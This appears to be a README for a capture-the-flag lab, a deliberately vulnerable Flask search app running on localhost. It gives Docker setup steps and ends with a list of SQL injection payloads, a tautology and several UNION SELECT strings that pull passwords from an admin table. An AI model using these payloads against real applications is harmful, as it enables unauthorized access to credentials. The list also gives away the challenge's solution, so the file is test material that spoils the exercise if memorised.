# UNION-based SQL Injection — CTF Challenge

## Summary
Simple Flask app with a user search feature vulnerable to UNION-based SQLi.
Goal: extract the admin password (flag) using a UNION SELECT.

## Quick start (Docker Compose)
1. Build and start:
```bash
docker-compose build
docker-compose up -d
```
2. Visit: http://localhost:5000
3. Use the username field to inject UNION payload and retrieve the flag.

## ' OR '1'='1
## nonexistent' UNION SELECT 1, 2, 3 -- 
## nonexistent' UNION SELECT username, password, 'x' FROM admin -- 
## nonexistent' UNION SELECT NULL, password, NULL FROM admin -- 
## nonexistent' UNION SELECT 1, password, 'x' FROM admin # 
## nonexistent' UNION SELECT 1, password, 'x' FROM admin -- 


